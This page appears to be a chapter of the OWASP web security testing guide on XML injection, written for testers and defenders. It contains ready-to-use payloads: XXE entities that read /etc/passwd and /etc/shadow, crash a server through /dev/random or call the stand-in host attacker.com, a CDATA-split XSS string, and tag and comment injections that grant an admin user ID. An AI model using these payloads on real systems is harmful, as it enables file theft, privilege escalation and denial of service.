<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>4.8.8 Testing for XML Injection (OTG-INPVAL-008)  </title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  
    <script type="text/javascript">
        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
        if (!in_frame()) {
            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
            window.location = 'index.html#' + page;
        }
    </script>
</head>
<body><div class="page"><h1 class="title">4.8.8 Testing for XML Injection (OTG-INPVAL-008)  </h1><br/><br /><h2>Summary</h2><br />XML Injection testing is when a tester tries to inject an XML doc to  the application. If the XML parser fails to contextually validate data,  then the test will yield a positive result.  <br /><br /> This section describes practical examples of XML Injection. First, an  XML style communication will be defined and its working principles  explained. Then, the discovery method in which we try to insert XML  metacharacters. Once the first step is accomplished, the tester will  have some information about the XML structure, so it will be possible to  try to inject XML data and tags (Tag Injection). <br /><br /> <br /><br /><h2>How to Test</h2><br />Let's suppose there is a web application using an XML style  communication in order to perform user registration. This is done by  creating and adding a new &lt;user&gt; node in an xmlDb file. <br /><br /> Let's suppose the xmlDB file is like the following: <br /><strong>&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt; <br />&lt;users&gt; <br />	&lt;user&gt; <br />		&lt;username&gt;gandalf&lt;/username&gt; <br />		&lt;password&gt;!c3&lt;/password&gt; <br />		&lt;userid&gt;0&lt;/userid&gt;<br />		&lt;mail&gt;gandalf@middleearth.com&lt;/mail&gt;<br />	&lt;/user&gt; <br />	&lt;user&gt; <br />		&lt;username&gt;Stefan0&lt;/username&gt; <br />		&lt;password&gt;w1s3c&lt;/password&gt; <br />		&lt;userid&gt;500&lt;/userid&gt;<br />		&lt;mail&gt;Stefan0@whysec.hmm&lt;/mail&gt;<br />	&lt;/user&gt; <br />&lt;/users&gt;</strong><br /><br /> When a user registers himself by filling an HTML form,  the application receives the user's data in a standard request, which, for the sake of simplicity, will be supposed to be sent as a GET request. <br /><br /> For example, the following values: <br /><strong>Username: tony</strong><br /><strong>Password: Un6R34kb!e</strong><br /><strong>E-mail: s4tan@hell.com</strong><br />will produce the request: <br />http://www.example.com/addUser.php?username=tony&amp;password=Un6R34kb!e&amp;email=s4tan@hell.com<br /><br /> The application, then, builds the following node: <br /><strong>&lt;user&gt; <br />	&lt;username&gt;tony&lt;/username&gt; <br />	&lt;password&gt;Un6R34kb!e&lt;/password&gt; <br />	&lt;userid&gt;500&lt;/userid&gt;<br />	&lt;mail&gt;s4tan@hell.com&lt;/mail&gt;<br />&lt;/user&gt;</strong><br /><br /> which will be added to the xmlDB: <br /><strong>&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt; <br />&lt;users&gt; <br />	&lt;user&gt; <br />		&lt;username&gt;gandalf&lt;/username&gt; <br />		&lt;password&gt;!c3&lt;/password&gt; <br />		&lt;userid&gt;0&lt;/userid&gt;<br />		&lt;mail&gt;gandalf@middleearth.com&lt;/mail&gt;<br />	&lt;/user&gt; <br />	&lt;user&gt; <br />		&lt;username&gt;Stefan0&lt;/username&gt; <br />		&lt;password&gt;w1s3c&lt;/password&gt; <br />		&lt;userid&gt;500&lt;/userid&gt;<br />		&lt;mail&gt;Stefan0@whysec.hmm&lt;/mail&gt;<br />	&lt;/user&gt; <br />	&lt;user&gt; <br />		&lt;username&gt;tony&lt;/username&gt; <br />		&lt;password&gt;Un6R34kb!e&lt;/password&gt; <br />		&lt;userid&gt;500&lt;/userid&gt;<br />		&lt;mail&gt;s4tan@hell.com&lt;/mail&gt;<br />	&lt;/user&gt; <br />&lt;/users&gt;</strong><br /><br /> <br /><br /><h3>Discovery</h3><br />The first step in order to test an application for the presence of a  XML Injection vulnerability consists of trying to insert XML  metacharacters. <br /><br /> XML metacharacters are: <br />•  <strong>Single quote: ' </strong> - When not sanitized, this character could throw an exception during XML parsing, if the injected value is going to be part of an attribute value in a tag.<br />As an example, let's suppose there is the following attribute: <br /><strong>&lt;node attrib='$inputValue'/&gt;</strong><br />So, if: <br /><strong>inputValue = foo'</strong><br />is instantiated and then is inserted as the attrib value: <br /><strong>&lt;node attrib='foo''/&gt;</strong><br />then, the resulting XML document is not well formed. <br />•  <strong>Double quote: " </strong>- this character has the same meaning as single quote and it could be used if the attribute value is enclosed in double quotes.<br /><strong>&lt;node attrib="$inputValue"/&gt;</strong><br />So if: <br /><strong>$inputValue = foo"</strong><br />the substitution gives: <br /><strong>&lt;node attrib="foo""/&gt;</strong><br />and the resulting XML document is invalid. <br />•  <strong>Angular parentheses: &gt; and &lt;</strong> - By adding an open or closed angular parenthesis in a user input like the following:<br /><strong>Username = foo&lt;</strong><br />the application will build a new node: <br /><strong>&lt;user&gt; <br />     &lt;username&gt;foo&lt;&lt;/username&gt; <br />     &lt;password&gt;Un6R34kb!e&lt;/password&gt; <br />     &lt;userid&gt;500&lt;/userid&gt;<br />     &lt;mail&gt;s4tan@hell.com&lt;/mail&gt;<br />&lt;/user&gt;</strong><br />but, because of the presence of the open '&lt;', the resulting XML document is invalid. <br /><br /> <br />•  <strong>Comment tag: &lt;!--/--&gt;</strong> -  This sequence of characters is interpreted as the beginning/end of a comment. So by injecting one of them in Username parameter:<br /><strong>Username = foo&lt;!--</strong><br />the application will build a node like the following: <br /><strong>&lt;user&gt; <br />    &lt;username&gt;foo&lt;!--&lt;/username&gt; <br />    &lt;password&gt;Un6R34kb!e&lt;/password&gt; <br />    &lt;userid&gt;500&lt;/userid&gt;<br />    &lt;mail&gt;s4tan@hell.com&lt;/mail&gt;<br />&lt;/user&gt;</strong><br />which won't be a valid XML sequence. <br />•  <strong>Ampersand: &amp; </strong>-   The ampersand is used in the XML syntax to represent entities. The format of an entity is '&amp;symbol;'. An entity is mapped to a character in the Unicode character set.<br />For example: <br /><strong>&lt;tagnode&gt;&amp;lt;&lt;/tagnode&gt;</strong><br />is well formed and valid, and represents the '&lt;' ASCII character. <br />If '&amp;' is not encoded itself with &amp;amp;, it could be used to test XML injection. <br />In fact, if an input like the following is provided: <br /><strong>Username = &amp;foo</strong><br />a new node will be created: <br /><strong>&lt;user&gt; <br />&lt;username&gt;&amp;foo&lt;/username&gt; <br />&lt;password&gt;Un6R34kb!e&lt;/password&gt; <br />&lt;userid&gt;500&lt;/userid&gt;<br />&lt;mail&gt;s4tan@hell.com&lt;/mail&gt;<br />&lt;/user&gt;</strong><br />but, again, the document is not valid: &amp;foo is not terminated with ';' and the &amp;foo; entity is undefined. <br /><br /> <br />•  <strong>CDATA section delimiters: &lt;![CDATA[ / ]]&gt;</strong> - CDATA sections are used to escape blocks of text containing characters which would otherwise be recognized as markup. In other words, characters enclosed in a CDATA section are not parsed by an XML parser.<br />For example, if there is the need to represent the string '&lt;foo&gt;' inside a text node, a CDATA section may be used: <br /><strong>&lt;node&gt;<br />    &lt;![CDATA[&lt;foo&gt;]]&gt;<br />&lt;/node&gt;</strong><br />so that '&lt;foo&gt;' won't be parsed as markup and will be considered as character data. <br />If a node is built in the following way: <br /><strong>&lt;username&gt;&lt;![CDATA[&lt;$userName]]&gt;&lt;/username&gt;</strong><br />the tester could try to inject the end CDATA string ']]&gt;' in order to try to invalidate the XML document. <br /><strong>userName  = ]]&gt;</strong><br />this will become: <br /><strong>&lt;username&gt;&lt;![CDATA[]]&gt;]]&gt;&lt;/username&gt;</strong><br />which is not a valid XML fragment. <br /><br /> Another test is related to CDATA tag. Suppose that the XML document is  processed to generate an HTML page. In this case, the CDATA section  delimiters may be simply eliminated, without further inspecting their  contents. Then, it is possible to inject HTML tags, which will be  included in the generated page, completely bypassing existing  sanitization routines. <br /><br /> Let's consider a concrete example. Suppose we have a node containing some text that will be displayed back to the user.  <br /><strong> &lt;html&gt;<br /> $HTMLCode<br /> &lt;/html&gt;</strong><br />Then, an attacker can provide the following input: <br /><strong>$HTMLCode = &lt;![CDATA[&lt;]]&gt;script&lt;![CDATA[&gt;]]&gt;alert('xss')&lt;![CDATA[&lt;]]&gt;/script&lt;![CDATA[&gt;]]&gt;</strong><br />and obtain the following node: <br /><strong>&lt;html&gt;<br />  &lt;![CDATA[&lt;]]&gt;script&lt;![CDATA[&gt;]]&gt;alert('xss')&lt;![CDATA[&lt;]]&gt;/script&lt;![CDATA[&gt;]]&gt;<br /> &lt;/html&gt;</strong><br />During the processing, the CDATA section delimiters are eliminated, generating the following HTML code: <br /><strong>&lt;script&gt;alert('XSS')&lt;/script&gt;</strong><br />The result is that the application is vulnerable to XSS.  <br /><br /> <strong>External Entity:</strong> The set of valid entities can be extended by defining new entities. If  the definition of an entity is a URI, the entity is called an external  entity. Unless configured to do otherwise, external entities force the  XML parser to access the resource specified by the URI, e.g., a file on  the local machine or on a remote systems. This behavior exposes the  application to XML eXternal Entity (XXE) attacks, which can be used to  perform denial of service of the local system, gain unauthorized access  to files on the local machine, scan remote machines, and perform denial  of service of remote systems.  <br /><br /> To test for XXE vulnerabilities, one can use the following input: <br /><strong>&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;<br /> &lt;!DOCTYPE foo [  <br />  &lt;!ELEMENT foo ANY &gt;<br />  &lt;!ENTITY xxe SYSTEM "file:///dev/random" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</strong><br /><br /> This test could crash the web server (on a UNIX system), if the XML  parser attempts to substitute the entity with the contents of the  /dev/random file. <br /><br /> Other useful tests are the following: <br /><strong><br /> &lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;<br /> &lt;!DOCTYPE foo [  <br />   &lt;!ELEMENT foo ANY &gt;<br />   &lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;<br /><br /> &lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;<br /> &lt;!DOCTYPE foo [  <br />   &lt;!ELEMENT foo ANY &gt;<br />   &lt;!ENTITY xxe SYSTEM "file:///etc/shadow" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;<br /><br /> &lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;<br /> &lt;!DOCTYPE foo [  <br />   &lt;!ELEMENT foo ANY &gt;<br />   &lt;!ENTITY xxe SYSTEM "file:///c:/boot.ini" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;<br /><br /> &lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;<br /> &lt;!DOCTYPE foo [  <br />   &lt;!ELEMENT foo ANY &gt;<br />   &lt;!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</strong><br /><br /> <br /><br /><h3>Tag Injection</h3><br />Once the first step is accomplished, the tester will have some  information about the structure of the XML document. Then, it is  possible to try to inject XML data and tags. We will show an example of  how this can lead to a privilege escalation attack. <br /><br /> Let's considering the previous application. By inserting the following values: <br /><strong>Username: tony</strong><br /><strong>Password: Un6R34kb!e</strong><br /><strong>E-mail: s4tan@hell.com&lt;/mail&gt;&lt;userid&gt;0&lt;/userid&gt;&lt;mail&gt;s4tan@hell.com</strong><br />the application will build a new node and append it to the XML database: <br /><strong>&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt; <br />&lt;users&gt; <br />	&lt;user&gt; <br />		&lt;username&gt;gandalf&lt;/username&gt; <br />		&lt;password&gt;!c3&lt;/password&gt; <br />		&lt;userid&gt;0&lt;/userid&gt;<br />		&lt;mail&gt;gandalf@middleearth.com&lt;/mail&gt;<br />	&lt;/user&gt; <br />	&lt;user&gt; <br />		&lt;username&gt;Stefan0&lt;/username&gt; <br />		&lt;password&gt;w1s3c&lt;/password&gt; <br />		&lt;userid&gt;500&lt;/userid&gt;<br />		&lt;mail&gt;Stefan0@whysec.hmm&lt;/mail&gt;<br />	&lt;/user&gt; <br />	&lt;user&gt; <br />		&lt;username&gt;tony&lt;/username&gt; <br />		&lt;password&gt;Un6R34kb!e&lt;/password&gt; <br />		&lt;userid&gt;500&lt;/userid&gt;<br />		&lt;mail&gt;s4tan@hell.com&lt;/mail&gt;&lt;userid&gt;0&lt;/userid&gt;&lt;mail&gt;s4tan@hell.com&lt;/mail&gt;<br />	&lt;/user&gt; <br />&lt;/users&gt;</strong><br /><br /> The resulting XML file is well formed. Furthermore, it is likely that,  for the user tony, the value associated with the userid tag is the one  appearing last, i.e., 0 (the admin ID). In other words, we have injected  a user with administrative privileges. <br /><br /> The only problem is that the userid tag appears twice in the last user  node. Often, XML documents are associated with a schema or a DTD and  will be rejected if they don't comply with it. <br /><br /> Let's suppose that the XML document is specified by the following DTD: <br /><strong>&lt;!DOCTYPE users [<br />	  &lt;!ELEMENT users (user+) &gt;<br />	  &lt;!ELEMENT user (username,password,userid,mail+) &gt;<br />	  &lt;!ELEMENT username (#PCDATA) &gt;<br />	  &lt;!ELEMENT password (#PCDATA) &gt;<br />	  &lt;!ELEMENT userid (#PCDATA) &gt;<br />	  &lt;!ELEMENT mail (#PCDATA) &gt;<br />]&gt;</strong><br /><br /> Note that the userid node is defined with cardinality 1. In this case,  the attack we have shown before (and other simple attacks) will not  work, if the XML document is validated against its DTD before any  processing occurs. <br /><br /> However, this problem can be solved, if the tester controls the value of  some nodes preceding the offending node (userid, in this example). In  fact, the tester can comment out such node, by injecting  a comment start/end sequence: <br /><br /> <br /><strong>Username: tony</strong><br /><strong>Password: Un6R34kb!e&lt;/password&gt;&lt;!--</strong><br /><strong>E-mail: --&gt;&lt;userid&gt;0&lt;/userid&gt;&lt;mail&gt;s4tan@hell.com</strong><br />In this case, the final XML database is: <br /><strong>&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt; <br />&lt;users&gt; <br />	&lt;user&gt; <br />		&lt;username&gt;gandalf&lt;/username&gt; <br />		&lt;password&gt;!c3&lt;/password&gt; <br />		&lt;userid&gt;0&lt;/userid&gt;<br />		&lt;mail&gt;gandalf@middleearth.com&lt;/mail&gt;<br />	&lt;/user&gt; <br />	&lt;user&gt; <br />		&lt;username&gt;Stefan0&lt;/username&gt; <br />		&lt;password&gt;w1s3c&lt;/password&gt; <br />		&lt;userid&gt;500&lt;/userid&gt;<br />		&lt;mail&gt;Stefan0@whysec.hmm&lt;/mail&gt;<br />	&lt;/user&gt; <br />	&lt;user&gt; <br />		&lt;username&gt;tony&lt;/username&gt; <br />		&lt;password&gt;Un6R34kb!e&lt;/password&gt;&lt;!--&lt;/password&gt; <br />		&lt;userid&gt;500&lt;/userid&gt;<br />		&lt;mail&gt;--&gt;&lt;userid&gt;0&lt;/userid&gt;&lt;mail&gt;s4tan@hell.com&lt;/mail&gt;<br />	&lt;/user&gt;<br />&lt;/users&gt;</strong><br /><br /> The original <em>userid</em> node has been commented out, leaving only the injected one. The document now complies with its DTD rules.<br /> <br /><br /><h2>Source Code Review</h2><br />The following Java API may be vulnerable to XXE if they are not configured properly. <br />•  javax.xml.parsers.DocumentBuilder<br />•  javax.xml.parsers.DocumentBuildFactory<br />•  org.xml.sax.EntityResolver<br />•  org.dom4j.*<br />•  javax.xml.parsers.SAXParser<br />•  javax.xml.parsers.SAXParserFactory<br />•  TransformerFactory<br />•  SAXReader<br />•  DocumentHelper<br />•  SAXBuilder<br />•  SAXParserFactory<br />•  XMLReaderFactory<br />•  XMLInputFactory<br />•  SchemaFactory<br />•  DocumentBuilderFactoryImpl<br />•  SAXTransformerFactory<br />•  DocumentBuilderFactoryImpl<br />•  XMLReader<br />•  Xerces: DOMParser, DOMParserImpl, SAXParser, XMLParser<br />Check source code if the docType, external DTD, and external parameter entities are set as forbidden uses. <br />•  <a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet">https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet</a><br />In addition, the Java POI office reader may be vulnerable to XXE if the version is under 3.10.1. <br />The version of POI library can be identified from the file name of the JAR. For example, <br />•  poi-3.8.jar<br />•  poi-ooxml-3.8.jar<br />The followings source code keyword may apply to C. <br />•  libxml2: xmlCtxtReadMemory,xmlCtxtUseOptions,xmlParseInNodeContext,xmlReadDoc,xmlReadFd,xmlReadFile ,xmlReadIO,xmlReadMemory, xmlCtxtReadDoc ,xmlCtxtReadFd,xmlCtxtReadFile,xmlCtxtReadIO <br />•  libxerces-c: XercesDOMParser, SAXParser, SAX2XMLReader<br /><br /><h2>References</h2><br /><strong>Whitepapers</strong><br /> <br />•  [1] Alex Stamos: "Attacking Web Services" - <a href="http://www.owasp.org/images/d/d1/AppSec2005DC-Alex_Stamos-Attacking_Web_Services.ppt">http://www.owasp.org/images/d/d1/AppSec2005DC-Alex_Stamos-Attacking_Web_Services.ppt</a><br /><br />•  Gregory Steuck, "XXE (Xml eXternal Entity) attack", <a href="http://www.securityfocus.com/archive/1/297714">http://www.securityfocus.com/archive/1/297714</a><br />•  OWASP XXE Prevention Cheat Sheet <a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet">https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet</a><br /></div></body></html>